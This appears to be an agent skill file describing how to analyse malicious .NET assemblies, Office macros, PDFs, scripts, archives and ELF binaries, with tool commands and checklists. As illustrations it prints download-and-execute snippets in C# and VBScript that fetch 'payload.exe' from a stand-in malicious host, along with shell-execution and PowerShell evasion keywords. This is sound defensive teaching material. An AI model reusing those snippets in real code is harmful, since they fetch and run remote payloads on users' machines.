---
name: specialized-file-analyzer
description: "Analyze non-PE file types in malware campaigns. Trigger: analyzing .NET assemblies, Office macros, PDFs, scripts, archives, or Linux ELF binaries."
license: Apache-2.0
metadata:
  author: gentleman-programming
  version: "1.0"
---

# Specialized File Analyzer

Expert analysis of non-PE file formats commonly used in malware campaigns: .NET, Office documents, PDFs, scripts, archives, and Linux binaries.

## When to Use This Skill

Use this skill when analyzing:
- **.NET/C# assemblies** (.exe, .dll with .NET framework)
- **Office documents** with macros (.docm, .xlsm, .doc, .xls)
- **PDF files** (suspicious attachments, exploit documents)
- **Scripts** (PowerShell .ps1, VBScript .vbs, JavaScript .js)
- **Archives** (.zip, .rar, .7z, .tar.gz)
- **Shortcuts** (.lnk files)
- **Linux binaries** (ELF executables)
- **Batch files** (.bat, .cmd)

**Key indicator:** `file` command shows non-PE32 executable or document type.

## Quick File Type Identification

```bash
# Identify file type
file sample.bin

# Common outputs:
# "PE32+ console executable, for MS Windows" → Standard PE (use malware-triage)
# "PE32 executable (GUI) Intel 80386 Mono/.Net assembly" → .NET (use this skill)
# "Microsoft Office Document" → Office macro (use this skill)
# "PDF document, version 1.7" → PDF (use this skill)
# "Zip archive data" → Archive (use this skill)
# "ELF 64-bit LSB executable" → Linux binary (use this skill)
# "ASCII text, with CRLF line terminators" → Script (use this skill)
```

---

## .NET / C# Assembly Analysis

### Detection
```bash
# Check for .NET assembly
file sample.exe | grep "Mono/.Net assembly"

# Or check strings
strings sample.exe | grep "mscoree.dll"
```

### Tool: dnSpy (Windows - Primary Tool)

**Download:** https://github.com/dnSpy/dnSpy

**Workflow:**
1. Open sample.exe in dnSpy
2. Navigate: Assembly Explorer → sample.exe → Namespace → Classes
3. Find entry point: Right-click assembly → Go to Entry Point

**What to Look For:**

**Main() Function:**
```csharp
// Entry point - start here
public static void Main(string[] args)
{
    // Analyze execution flow
}
```

**Suspicious Namespaces:**
- `System.Net` - Network operations (WebClient, HttpClient)
- `System.Security.Cryptography` - Encryption/decryption
- `System.Reflection` - Dynamic code loading
- `System.Diagnostics.Process` - Process execution
- `System.IO` - File operations
- `Microsoft.Win32` - Registry access

**Common Malicious Patterns:**
```csharp
// Download and execute
WebClient wc = new WebClient();
wc.DownloadFile("http://malicious.com/payload.exe", "C:\\temp\\payload.exe");
Process.Start("C:\\temp\\payload.exe");

// Base64 decode embedded payload
byte[] decoded = Convert.FromBase64String(encodedPayload);

// Reflective loading
Assembly.Load(byte[] rawAssembly);
```

**Extract Embedded Resources:**
```
Assembly Explorer → Right-click assembly → Resources
Look for:
- Embedded executables (byte arrays)
- Encrypted payloads
- Configuration data
- Icons (may hide data)

Right-click resource → Save
```

**Deobfuscation:**
```bash
# Using de4dot (automated deobfuscator)
de4dot sample.exe -o sample_deobfuscated.exe
```

### Tool: ILSpy (Cross-platform Alternative)

```bash
# Command-line decompilation
ilspycmd sample.exe -o output_directory/
```

### Analysis Checklist - .NET

- [ ] Entry point identified (Main function)
- [ ] Obfuscation detected and removed (if needed)
- [ ] Embedded resources extracted
- [ ] Network URLs/IPs extracted
- [ ] Crypto keys identified
- [ ] Anti-analysis checks found
- [ ] Payload execution method documented
- [ ] IOCs extracted (URLs, IPs, file paths)

---

## Office Document / Macro Analysis

### Detection
```bash
# Macro-enabled formats
# .docm, .xlsm, .pptm → Office 2007+ with macros
# .doc, .xls, .ppt → Legacy Office (97-2003) with macros

file document.docm

# Quick macro check
strings document.docm | grep -i "vba\|macro\|autoopen"
```

### Tool: oledump.py (Primary - Didier Stevens)

**Workflow:**

**1. List Streams:**
```bash
python oledump.py document.docm

# Example output:
#  1:       114 '\x01CompObj'
#  2:      4096 '\x05DocumentSummaryInformation'
#  3: M    8192 'Macros/VBA/ThisDocument'  ← Macro present (M indicator)
#  4: m    1024 'Macros/VBA/_VBA_PROJECT'
#  5: M    4096 'Macros/VBA/Module1'
```

**2. Extract Macro Code:**
```bash
# Extract macro from stream 3
python oledump.py -s 3 -v document.docm

# Save to file
python oledump.py -s 3 -v document.docm > extracted_macro.vba
```

**3. Analyze Macro Code:**

Look for **Auto-Execution Functions:**
```vba
Sub AutoOpen()          ' Word - runs on document open
Sub Document_Open()     ' Word - runs on document open
Sub Workbook_Open()     ' Excel - runs on workbook open
Sub Auto_Open()         ' Excel - runs on workbook open
```

Look for **Suspicious VBA Functions:**
```vba
' Command execution
Shell("cmd.exe /c powershell ...")
CreateObject("WScript.Shell").Run "..."

' File download
CreateObject("MSXML2.XMLHTTP")
URLDownloadToFile ...

' File system operations
CreateObject("Scripting.FileSystemObject")
```

### Tool: olevba (oletools Suite)

**Installation:**
```bash
pip install oletools
```

**Automated Analysis:**
```bash
# Comprehensive analysis
olevba document.docm

# Decode obfuscated strings
olevba --decode document.docm
```

**Output Interpretation:**
- **AutoExec** - Auto-execution keywords found
- **Suspicious** - Suspicious VBA keywords
- **IOCs** - URLs, IPs, file paths
- **Hex Strings** - Encoded data
- **Base64 Strings** - Encoded payloads

### Analysis Checklist - Office Documents

- [ ] Macro presence confirmed
- [ ] All macro streams extracted
- [ ] Auto-execution functions identified
- [ ] Obfuscated strings decoded
- [ ] Download URLs extracted
- [ ] Payload execution method documented
- [ ] External template checked (.docx/.xlsx)
- [ ] Embedded objects analyzed
- [ ] IOCs extracted and defanged

---

## PDF Analysis

### Detection
```bash
file document.pdf
```

### Tool: pdfid.py (Didier Stevens)

**Quick Triage:**
```bash
python pdfid.py document.pdf

# Red flags:
# /OpenAction   - Executes action on open
# /AA           - Additional actions (auto-execute)
# /JavaScript   - Embedded JavaScript
# /JS           - JavaScript (short form)
# /Launch       - Launch external program
# /EmbeddedFile - Embedded files
# /RichMedia    - Flash/multimedia content
```

### Tool: pdf-parser.py (Didier Stevens)

**Extract JavaScript:**
```bash
# Search for JavaScript objects
python pdf-parser.py --search javascript document.pdf

# Extract specific object
python pdf-parser.py --object 15 document.pdf

# Dump JavaScript code
python pdf-parser.py --object 15 --raw document.pdf > extracted_js.txt
```

### Analysis Checklist - PDF

- [ ] pdfid scan completed (flags identified)
- [ ] JavaScript extracted (if present)
- [ ] Embedded files extracted
- [ ] Auto-action mechanism documented
- [ ] Shellcode indicators checked
- [ ] URLs/IPs extracted from JS
- [ ] IOCs documented

---

## PowerShell / Script Analysis

### PowerShell (.ps1) Deobfuscation

**Common Obfuscation Patterns:**

**Base64 Encoding:**
```powershell
# Encoded command execution
powershell.exe -EncodedCommand <base64_string>
```

**Suspicious PowerShell Patterns:**
- `Invoke-Expression` / `IEX` - Execute string as code
- `Invoke-WebRequest` / `Invoke-RestMethod` - Download content
- `DownloadString` / `DownloadFile` - Download payloads
- `FromBase64String` - Decode embedded payload
- `IO.Compression.GzipStream` - Decompress payload
- `Reflection.Assembly]::Load` - Load assembly from memory
- `-EncodedCommand` - Base64 encoded command
- `-WindowStyle Hidden` - Hide window
- `-ExecutionPolicy Bypass` - Bypass script execution policy

### VBScript (.vbs) Analysis

```vbs
' Common malicious patterns:

' Command execution
CreateObject("WScript.Shell").Run "cmd.exe /c ..."

' HTTP download
Set objHTTP = CreateObject("MSXML2.XMLHTTP")
objHTTP.Open "GET", "http://malicious.com/payload.exe", False
objHTTP.Send
```

### JavaScript (.js) Analysis

```bash
# Beautify obfuscated JS
cat malicious.js | js-beautify > beautified.js
```

**Suspicious Patterns:**
```javascript
// Code execution
eval(encodedCode);

// ActiveX (Windows COM objects)
var shell = new ActiveXObject("WScript.Shell");
shell.Run("cmd.exe /c ...");
```

### Analysis Checklist - Scripts

- [ ] Script type identified (PS1, VBS, JS, BAT)
- [ ] Obfuscation detected and removed
- [ ] Base64/encoded strings decoded
- [ ] Download URLs extracted
- [ ] Execution commands documented
- [ ] Dropped file paths identified
- [ ] IOCs extracted (URLs, IPs, domains)

---

## Archive Analysis

### Safe Inspection (No Extraction)

```bash
# List contents without extracting
7z l archive.zip
unzip -l archive.zip
tar -tzf archive.tar.gz

# Look for red flags:
# - Double extensions (invoice.pdf.exe)
# - Executable files (.exe, .scr, .com, .bat, .vbs)
# - LNK files (shortcuts)
# - Deeply nested archives
```

### LNK (Shortcut) File Analysis

**Manual Strings Analysis:**
```bash
strings malicious.lnk | grep -E "\.exe|\.dll|http|powershell|cmd"
```

### Analysis Checklist - Archives

- [ ] Contents listed without extraction
- [ ] File extensions verified (no double extensions)
- [ ] Files extracted to isolated directory
- [ ] All extracted files typed (file command)
- [ ] LNK files analyzed (if present)
- [ ] Nested archives checked
- [ ] Password documented (if applicable)

---

## Linux / ELF Binary Analysis

### Detection
```bash
file sample.bin
# Output: "ELF 64-bit LSB executable, x86-64"
```

### Static Analysis

**ELF Header:**
```bash
readelf -h sample.bin
```

**Imported Libraries:**
```bash
ldd sample.bin
```

**Imported Symbols:**
```bash
nm -D sample.bin
objdump -T sample.bin

# Search for suspicious functions:
nm -D sample.bin | grep -E "socket|connect|fork|exec|ptrace|system"
```

**Strings:**
```bash
strings -a sample.bin | grep -E "http|/tmp|/etc|passwd"
```

### Dynamic Analysis (Linux)

**strace - System Call Monitoring:**
```bash
# Monitor all system calls
strace -f ./sample.bin 2>&1 | tee strace_output.txt

# Network operations only
strace -e trace=socket,connect,send,recv ./sample.bin
```

### Analysis Checklist - ELF

- [ ] Architecture identified (x86/x64/ARM)
- [ ] Imported libraries documented
- [ ] Suspicious functions identified
- [ ] Packing detected and removed (if UPX)
- [ ] Strings extracted and analyzed
- [ ] System calls monitored (strace)
- [ ] Network activity captured
- [ ] File operations documented

---

## Integration with Report Writing

Each file type contributes specific sections to the malware analysis report:

**.NET Analysis** → Decompiled code snippets, embedded resource descriptions
**Office Macros** → Macro code (sanitized), auto-execution methods, download URLs
**PDF Analysis** → Embedded JavaScript, auto-action triggers, exploit CVEs
**Scripts** → Deobfuscated code, execution flow, download cradles
**Archives/LNK** → Archive structure, masquerading techniques, LNK target analysis
**ELF Binaries** → System calls used, network protocols, persistence mechanisms

---

## Tool Quick Reference

| File Type | Primary Tool | Secondary Tool |
|-----------|--------------|----------------|
| **.NET** | dnSpy | ILSpy, de4dot |
| **Office Macros** | oledump.py | olevba, XLMMacroDeobfuscator |
| **PDF** | pdfid.py, pdf-parser.py | peepdf |
| **PowerShell** | PSDecode | Manual analysis |
| **VBScript/JS** | Text editor + analysis | js-beautify |
| **Archives** | 7z, unzip, tar | - |
| **LNK** | LECmd (Win), lnkinfo (Linux) | strings |
| **ELF** | readelf, nm, objdump | strace, ltrace |

---

## Best Practices

**Do:**
- Always identify file type first (`file` command)
- Extract in isolated environments
- Document obfuscation techniques
- Save original and deobfuscated versions
- Test extracted IOCs for accuracy
- Cross-reference with VirusTotal/MalwareBazaar

**Don't:**
- Execute scripts without understanding them first
- Trust file extensions (check magic bytes)
- Skip deobfuscation steps
- Extract archives directly to important directories
- Assume password-protected = safe

---

## Example Usage

**User request:** "I have a suspicious .docm file with macros, help me analyze it"

**Workflow:**
1. Confirm file type (Office document)
2. Use oledump.py to list streams
3. Extract VBA macro code
4. Identify auto-execution functions
5. Decode obfuscated strings
6. Extract download URLs and IOCs
7. Document payload delivery method
8. Prepare findings for report

## Validation

To verify this skill works correctly:

1. **Load test**: Confirm the skill loads without frontmatter parsing errors.
2. **File type test**: Verify all 8 file type sections (.NET, Office, PDF, Scripts, Archives, LNK, ELF, Batch) have analysis checklists.
3. **Tool test**: Check that all referenced tools (dnSpy, oledump.py, pdfid.py, pdf-parser.py, olevba, readelf, strace) have correct command examples.
4. **Checklist test**: Validate each file type's analysis checklist has appropriate items for that format.
5. **Integration test**: Confirm referenced skills (malware-triage, malware-report-writer) exist.
